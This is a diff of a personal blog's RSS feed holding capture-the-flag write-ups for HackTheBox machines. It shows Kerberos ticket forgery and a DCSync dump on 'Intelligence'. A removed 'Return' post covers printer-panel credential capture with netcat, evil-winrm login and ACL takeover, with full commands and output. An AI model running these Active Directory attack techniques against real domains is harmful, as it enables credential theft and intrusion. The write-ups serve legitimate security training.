+</span></span></code></pre></div><p>With that, I can abuse this permission and perform <a href="https://attack.mitre.org/techniques/T1558/002/">Silver Ticket</a> attack, I&rsquo;ll use <code>impacket-getST</code> tool, but the result says clock skew too great.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
 </span></span><span class="line"><span class="cl">$ impacket-getST <span class="s1">&#39;intelligence.htb/svc_int$&#39;</span>  -spn <span class="s1">&#39;WWW\dc.intelligence.htb&#39;</span> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator
 </span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
@@ -390,10 +590,8 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
 </span></span><span class="line"><span class="cl">Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
 </span></span></code></pre></div><p>To resolve that, I&rsquo;ll need to synchronize my machine time with the DC. This can be done with <code>ntpdate</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
-</span></span><span class="line"><span class="cl">$ sudo apt install ntpdate    
-</span></span><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
-</span></span><span class="line"><span class="cl">$ sudo ntpdate 10.10.10.248
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
+</span></span><span class="line"><span class="cl">$ sudo apt install ntpdate <span class="o">&amp;&amp;</span> sudo ntpdate 10.10.10.248
 </span></span><span class="line"><span class="cl"><span class="m">18</span> Jul 14:57:39 ntpdate<span class="o">[</span>63324<span class="o">]</span>: adjust <span class="nb">time</span> server 10.10.10.248 offset +0.001305 sec
 </span></span></code></pre></div><p>On the next attempt, I have obtained the admin ticket (TGS).</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75»
@@ -408,9 +606,7 @@
 </span></span></code></pre></div><h4 id="dcsync">DCSync</h4>
 <p>Although the admin ticket was actually requested for <code>WWW\dc.intelligence.htb</code>, it actually can be used for other service, like DRS (Directory Replication Service) for DCSync attack.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
-</span></span><span class="line"><span class="cl">$ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
-</span></span><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
-</span></span><span class="line"><span class="cl">$ impacket-secretsdump -k -no-pass dc.intelligence.htb -just-dc-user administrator
+</span></span><span class="line"><span class="cl">$ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache <span class="o">&amp;&amp;</span> impacket-secretsdump -k -no-pass dc.intelligence.htb -just-dc-user administrator
 </span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
@@ -1664,363 +1860,6 @@ Skills Learned XXE attack Code injection Tools Nmap Burp Suite Reconnaissance Nm
 </ol>
 </div>
 ]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Return</title>
-      <link>https://fahmifj.github.io/hackthebox/return/</link>
-      <pubDate>Sun, 24 Oct 2021 09:12:47 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/hackthebox/return/</guid>
-      <description>Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer&amp;rsquo;s address to my IP, I can obtain the unmasked password. Enumerating the user&amp;rsquo;s info reveals that it&amp;rsquo;s member of two privileged groups which can then be abused to gain administrative access in multiple ways.</description>
-      <content:encoded><![CDATA[<p>Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer&rsquo;s address to my IP, I can obtain the unmasked password. Enumerating the user&rsquo;s info reveals that it&rsquo;s member of two privileged groups which can then be abused to gain administrative access in multiple ways.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>Abusing network printer</li>
-<li>Abusing Windows Server Operators group</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap</li>
-<li>Netcat</li>
-<li><a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1">ACL-FullControl.ps1</a></li>
-<li><a href="https://github.com/fahmifj/AAD-scripts/blob/main/Acl-RevokeFullControl.ps1">ACL-RevokeFullControl.ps1</a></li>
-<li><a href="https://github.com/calebstewart/CVE-2021-1675">PrintNightmare LPE</a></li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>Full TCP scan discovers a bunch of ports open. Seeing port 53, 88, and 389, I can safely assume this is Active Directory system.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.13» 
-</span></span><span class="line"><span class="cl">$ fscan 10.10.11.108 <span class="k">return</span>
-</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.108 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
-</span></span><span class="line"><span class="cl">nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49676,49688,59797 -sC -sV -oA nmap/all-tcp-ports-return 10.10.11.108
-</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-15 18:48 EDT
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.108
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.066s latency<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
-</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
-</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
-</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: HTB Printer Admin Panel
-</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-10-15 23:14:10Z<span class="o">)</span>
-</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
-</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: <span class="k">return</span>.local0., Site: Default-First-Site-Name<span class="o">)</span>
-</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
-</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
-</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
-</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: <span class="k">return</span>.local0., Site: Default-First-Site-Name<span class="o">)</span>
-</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
-</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
-</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
-</span></span><span class="line"><span class="cl">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
-</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span class="line"><span class="cl">49665/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span class="line"><span class="cl">49669/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span class="line"><span class="cl">49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-</span></span><span class="line"><span class="cl">49671/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span class="line"><span class="cl">49673/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span class="line"><span class="cl">49676/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span class="line"><span class="cl">49688/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span class="line"><span class="cl">59797/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span class="line"><span class="cl">Service Info: Host: PRINTER<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Host script results:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 25m20s
-</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
-</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-10-15T23:15:10
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 72.44 seconds
-</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
-<p>On SMB, anonymous login is allowed, but there is no share available.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
-</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.11.108/
-</span></span><span class="line"><span class="cl">Anonymous login successful
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
-</span></span><span class="line"><span class="cl">        ---------       ----      -------
-</span></span><span class="line"><span class="cl">SMB1 disabled -- no workgroup available
-</span></span></code></pre></div><p>I tried to enumerate the domain users, but got access denied.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
-</span></span><span class="line"><span class="cl">$ rpcclient -U <span class="s1">&#39;%&#39;</span> 10.10.11.108                                                     
-</span></span><span class="line"><span class="cl">rpcclient $&gt; srvinfo
-</span></span><span class="line"><span class="cl">Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
-</span></span><span class="line"><span class="cl">rpcclient $&gt; enumdomusers 
-</span></span><span class="line"><span class="cl">result was NT_STATUS_ACCESS_DENIED
-</span></span></code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
-<p>Without creds, there is no hope here.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
-</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.11.108 -b <span class="s2">&#34;dc=return,dc=local&#34;</span>
-</span></span><span class="line"><span class="cl">Operations error <span class="o">(</span>1<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Additional information: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this operation a successful <span class="nb">bind</span> must be completed on the connection., data 0, v4563
-</span></span></code></pre></div><h3 id="tcp-80---printer-panel">TCP 80 - Printer Panel</h3>
-<p>A printer admin panel for managing printer is shown on port 80.</p>
-<p><div class="img-container"><img src="imgs/image-20211017015705468.png" alt="image-20211017015705468"  /></div>
-</p>
-<p>Under the settings menu, I can see the printer&rsquo;s configuration, which reveals a username and a masked password. This password can&rsquo;t be unmasked by modifying the HTML attribute.</p>
-<p><div class="img-container"><img src="imgs/image-20211017015826808.png" alt="image-20211017015826808"  /></div>
-</p>
-<p>Clicking on the update button sends out a POST request with parameter <code>ip</code> to Return&rsquo;s IP.</p>
-<p><div class="img-container"><img src="imgs/image-20211017023404252.png" alt="image-20211017023404252"  /></div>
-</p>
-<p>The key takeaway from this is that I was the one who triggered that request.</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-svc-printer">Shell as svc-printer</h3>
-<h4 id="capturing-password">Capturing Password</h4>
-<p>From the previous enumeration on printer panel, what if I change the server address to my IP and setup a nc listener?.</p>
-<p><div class="img-container"><img src="imgs/image-20211017022203702.png" alt="image-20211017022203702"  /></div>
-</p>
-<p>The answer is the password pops up on my listener.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
-</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">389</span>
-</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">389</span> ...
-</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.11<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.108<span class="o">]</span> <span class="m">50904</span>
-</span></span><span class="line"><span class="cl">0*<span class="sb">`</span>%return<span class="se">\s</span>vc-printer�
-</span></span><span class="line"><span class="cl">                       1edFg43012!!
-</span></span></code></pre></div><p>CrackMapExec shows that <code>return\svc-printer:1edFg43012!!</code> is a valid credentials.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
-</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p <span class="s1">&#39;1edFg43012!!&#39;</span>
-</span></span><span class="line"><span class="cl">SMB         10.10.11.108    <span class="m">445</span>    PRINTER          <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-</span></span><span class="line"><span class="cl">SMB         10.10.11.108    <span class="m">445</span>    PRINTER          <span class="o">[</span>+<span class="o">]</span> <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! 
-</span></span><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
-</span></span><span class="line"><span class="cl">$ crackmapexec winrm 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p <span class="s1">&#39;1edFg43012!!&#39;</span> 	
-</span></span><span class="line"><span class="cl">WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span>
-</span></span><span class="line"><span class="cl">WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>*<span class="o">]</span> http://10.10.11.108:5985/wsman
-</span></span><span class="line"><span class="cl">WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>+<span class="o">]</span> <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! <span class="o">(</span>Pwn3d!<span class="o">)</span>
-</span></span></code></pre></div><h4 id="winrm---svc-printer">WinRM - svc-printer</h4>
-<p>I can login via WinRM and grab the flag.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
-</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p<span class="s1">&#39;1edFg43012!!&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; 
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\D</span>esktop
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; gci
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
-</span></span><span class="line"><span class="cl">----                -------------         ------ ----
-</span></span><span class="line"><span class="cl">-ar---       10/14/2021  10:33 PM             <span class="m">34</span> user.txt
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; gc user.txt 
-</span></span><span class="line"><span class="cl">48ba9...<span class="o">[</span>SNIP<span class="o">]</span>...
-</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="administrative-access">Administrative Access</h3>
-<h4 id="enumeration-1">Enumeration</h4>
-<p>Checking user&rsquo;s privileges with <code>whoami</code> reveals that <code>svc-printer</code> is a member of Server Operators and Print Operators. There are also some access tokens that can be abused.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; whoami /all
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">USER INFORMATION
-</span></span><span class="line"><span class="cl">----------------
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">User Name          <span class="nv">SID</span>
-</span></span><span class="line"><span class="cl"><span class="o">==================</span> <span class="o">=============================================</span>
-</span></span><span class="line"><span class="cl"><span class="k">return</span><span class="se">\s</span>vc-printer S-1-5-21-3750359090-2939318659-876128439-1103
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">GROUP INFORMATION
-</span></span><span class="line"><span class="cl">-----------------
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Group Name                                 Type             SID          <span class="nv">Attributes</span>
-</span></span><span class="line"><span class="cl"><span class="o">==========================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
-</span></span><span class="line"><span class="cl">Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\S</span>erver Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
-</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\P</span>rint Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
-</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\R</span>emote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
-</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\U</span>sers                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\P</span>re-Windows <span class="m">2000</span> Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
-</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>ETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
-</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\T</span>his Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>TLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-</span></span><span class="line"><span class="cl">Mandatory Label<span class="se">\H</span>igh Mandatory Level       Label            S-1-16-12288
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
-</span></span><span class="line"><span class="cl">----------------------
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Privilege Name                Description                         <span class="nv">State</span>
-</span></span><span class="line"><span class="cl"><span class="o">=============================</span> <span class="o">===================================</span> <span class="o">=======</span>
-</span></span><span class="line"><span class="cl">SeMachineAccountPrivilege     Add workstations to domain          Enabled
-</span></span><span class="line"><span class="cl">SeLoadDriverPrivilege         Load and unload device drivers      Enabled
-</span></span><span class="line"><span class="cl">SeSystemtimePrivilege         Change the system <span class="nb">time</span>              Enabled
-</span></span><span class="line"><span class="cl">SeBackupPrivilege             Back up files and directories       Enabled
-</span></span><span class="line"><span class="cl">SeRestorePrivilege            Restore files and directories       Enabled
-</span></span><span class="line"><span class="cl">SeShutdownPrivilege           Shut down the system                Enabled
-</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
-</span></span><span class="line"><span class="cl">SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
-</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span>      Enabled
-</span></span><span class="line"><span class="cl">SeTimeZonePrivilege           Change the <span class="nb">time</span> zone                Enabled
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">USER CLAIMS INFORMATION
-</span></span><span class="line"><span class="cl">-----------------------
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">User claims unknown.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Kerberos support <span class="k">for</span> Dynamic Access Control on this device has been disabled.
-</span></span></code></pre></div><p>According to this <a href="https://ss64.com/nt/syntax-security_groups.html">site</a>, <strong>Server Operators</strong> is:</p>
-<blockquote>
-<p>A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.</p>
-</blockquote>
-<p>I can say that <strong>Server Operators</strong> is the ultimate version of <strong>Backup Operators</strong>.</p>
-<p>As for Print Operators, I&rsquo;ll remember from HTB: Fuse that it can be exploited by loading a malicious driver using <code>SeLoadDriverPrivilege</code>. I don&rsquo;t demo it here, so see <a href="https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system">this awesome post</a> by 0xdf instead.</p>
-<p>Further enumeration reveals that Print Spooler is running ( ͡° ͜ʖ ͡°).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; Get-Service -Name Spooler
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Status   Name               DisplayName
-</span></span><span class="line"><span class="cl">------   ----               -----------
-</span></span><span class="line"><span class="cl">Running  Spooler            Print Spooler
-</span></span></code></pre></div><h4 id="diskshadow-failed">DiskShadow (failed)</h4>
-<p>The back up and restore files involve two access tokens: <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>. These tokens were previously abused to dump AD database (NTDS.d) in <a href="https://fahmifj.github.io/hackthebox/blackfield/#shell-as-administrator">HTB: Blackfield</a>.</p>
-<p>I tried to reproduce the attack here, but I got the following results.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; diskshadow /s script.txt
-</span></span><span class="line"><span class="cl">Microsoft DiskShadow version 1.0
-</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2013</span> Microsoft Corporation
-</span></span><span class="line"><span class="cl">On computer:  PRINTER,  10/16/2021 1:24:40 PM
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">-&gt; <span class="nb">set</span> context persistent nowriters
-</span></span><span class="line"><span class="cl">-&gt; add volume c: <span class="nb">alias</span> iamf
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">COM call <span class="s2">&#34;(*vssObject)-&gt;InitializeForBackup&#34;</span> failed.
-</span></span></code></pre></div><p>The intended way, according to the official writeup, is to abuse the <code>Server Operators</code> ability to start/stop/modify services, but I&rsquo;ll put that aside.</p>
-<h4 id="acl-full-access">ACL Full Access</h4>
-<p>There is another way that still involves the <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>. It&rsquo;s to modify ACL and grant myself full access to the file/folder I specified using <a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1">this PowerShell script</a>. In the following, I use that script to own the entire admin&rsquo;s desktop folder.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt;Acl-FullControl -user <span class="k">return</span><span class="se">\s</span>vc-printer -path c:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current permissions:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
-</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
-</span></span><span class="line"><span class="cl">Access : NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
-</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
-</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
-</span></span><span class="line"><span class="cl">Audit  :
-</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:<span class="o">(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Changing permissions to c:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Acls changed successfully.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
-</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
